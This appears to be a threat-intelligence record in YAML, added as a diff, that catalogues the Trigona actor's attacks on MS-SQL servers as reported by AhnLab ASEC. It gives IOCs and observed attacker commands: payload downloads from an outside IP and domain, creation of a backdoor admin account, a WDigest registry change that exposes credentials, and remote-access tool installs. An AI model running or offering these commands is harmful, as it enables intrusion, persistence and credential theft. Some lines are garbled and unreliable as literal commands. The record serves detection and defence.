@@ -1,0 +1,121 @@
+description: Trigona threat actor attacks MS-SQL servers using CLRShell, Potato-like
+  malware, CoinMiners, Proxyware, and backdoors like Gh0stRAT, CobaltStrike, Meterpreter,
+  AnyDesk, and RustDesk.
+attribution: Trigona
+malware_families:
+- CLRShell
+- Potato-like malware
+- CoinMiners
+- Proxyware
+- Gh0stRAT
+- CobaltStrike
+- Meterpreter
+- AnyDesk
+- RustDesk
+TTPs:
+  processes:
+  - cmd.exe
+  - powershell.exe
+  - bcp.exe
+  - curl
+  - bitsadmin
+  - AD.exe
+  commandline:
+  - hostname
+  - whoami
+  - systeminfo
+  - tasklist
+  - wmic useraccount where (LocalAccount=True) get name
+  - powershell -Command net user ladmin
+  - bcp select binaryTable from uGnzBdZbsi queryout C:\\ProgramData\\spd.exe -T -f
+    C:\\ProgramData\\FODsOZKgAU.txt
+  - bcp select binaryTable from uGnzBdZbsi queryout C:\\ProgramData\\AD.exe -T -f
+    C:\\ProgramData\\FODsOZKgAU.txt
+  - bcp select binaryTable from uGnzBdZbsi queryout C:\\users\\[username]\\music\\L.bat
+    -T -f C:\\users\\[username]\\music\\FODsOZKgAU.txt
+  - bcp select binaryTable from uGnzBdZbsi queryout C:\\users\\[User Name]\\music\\pci2.exe
+    -T -f C:\\users\\[User Name]\\music\\FODsOZKgAU.txt
+  - curl hxxps://cia.tf/60b30e194972f937b859d0075be69e2a.exe -o C:\\Windows\\SERVIC~1\\MSSQL$~1\\AppData\\Local\\Temp\\glock.exe
+  - bitsadmin /transfer indirme /download /priority normal hxxp://195.66.214.79/pci.exe
+    c:\\users\\[User Name]\\Videos\\pci.exe
+  - powershell Invoke-WebRequest -Uri hxxp://195.66.214.79/L.bat -OutFile c:\\users\\[User
+    Name]\\music\\L.bat
+  - '%SystemDrive%/programdata/AD.exe install C:\\programdata silent'
+  - '%SystemDrive%/programdata/Anydesk-e7eba7df get-id'
+  - net user Ladmin !!!SHENNENNS /add
+  - net localgroup administrators Ladmin /add
+  - net localgroup Adninistradores Ladnin /add
+  - net localgroup Administratoren Ladwin /add
+  - net localgroup Administrateurs Ladmin /add
+  - net localgroup Renote Desktop Users Ladmin /add
+  - net accounts /maxpwage:unliited
+  - c:\\users\\public\\music\\AD.exe --install C:\\"Program Files (x86)\\" --silent
+  - REG ADD "HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\wdigest"
+    /v UselogonCredential /t REG_DWORD /d x@@e090e1del "Hnfo"
+  - '@shife /enet user erp2 ErlEEEEN /add & net localgroup administrators erp2 /add'
+  - c:/programdata/AD.exe --install C:\\programdata --silent
+  - msiexec /i https://getteramind.com/cloud - N/ hidden/win/25.25.2685/dice N, {17589/
+    teramind_agent x64_s-i(__c I | 046 a64a) .msi TMROUTER=finalegitim.teramind.co
+    /q /n
+  powershell:
+  - Invoke-WebRequest -Uri hxxp://195.66.214.79/L.bat -OutFile c:\\users\\[User Name]\\music\\L.bat
+  - net user Ladmin !!!SHENNENNS /add
+  - net localgroup administrators Ladmin /add
+  - net localgroup Adninistradores Ladnin /add
+  - net localgroup Administratoren Ladwin /add
+  - net localgroup Administrateurs Ladmin /add
+  - net localgroup Renote Desktop Users Ladmin /add
+  - net accounts /maxpwage:unliited
+  scripting_engine:
+  - Batch
+  registry_keys:
+  - HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\wdigest
+  image_load: []
+  network_connections: []
+  file_activity:
+  - C:\\ProgramData\\spd.exe
+  - C:\\ProgramData\\AD.exe
+  - C:\\users\\[username]\\music\\L.bat
+  - C:\\users\\[User Name]\\music\\pci2.exe
+  - C:\\Windows\\SERVIC~1\\MSSQL$~1\\AppData\\Local\\Temp\\glock.exe
+  - c:\\users\\[User Name]\\Videos\\pci.exe
+  - c:\\users\\[User Name]\\music\\L.bat
+  - C:\\programdata
+  - '%SystemDrive%/programdata/AD.exe'
+  - '%SystemDrive%/programdata/Anydesk-e7eba7df'
+  - c:\\users\\public\\music\\AD.exe
+  - HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\wdigest
+  persistence:
+  - net user Ladmin !!!SHENNENNS /add
+  - net localgroup administrators Ladmin /add
+  - net localgroup Adninistradores Ladnin /add
+  - net localgroup Administratoren Ladwin /add
+  - net localgroup Administrateurs Ladmin /add
+  - net localgroup Renote Desktop Users Ladmin /add
+  - net accounts /maxpwage:unliited
+  process_relations:
+  - sqlservr.exe -> bep.exe
+  - bep.exe -> spd.exe
+  - bep.exe -> AD.exe
+  - AD.exe -> Anydesk-e7eba7df
+  - Anydesk-e7eba7df -> L.bat
+  - L.bat -> pci2.exe
+  - AD.exe -> erp2
+IOCs:
+  hashes: []
+  ip_addresses:
+  - 195.66.214.79
+  domains:
+  - cia.tf
+  - getteramind.com
+  - finalegitim.teramind.co
+  urls:
+  - hxxps://cia.tf/60b30e194972f937b859d0075be69e2a.exe
+  - hxxp://195.66.214.79/pci.exe
+  - hxxp://195.66.214.79/L.bat
+  - https://getteramind.com/cloud
+authors:
+- AhnLab SEcurity intelligence Center (ASEC)
+reference: https://asec.ahnlab.com/en/92003/
+date_of_publication: January 07, 2026
+file_creation_date: January 14, 2026
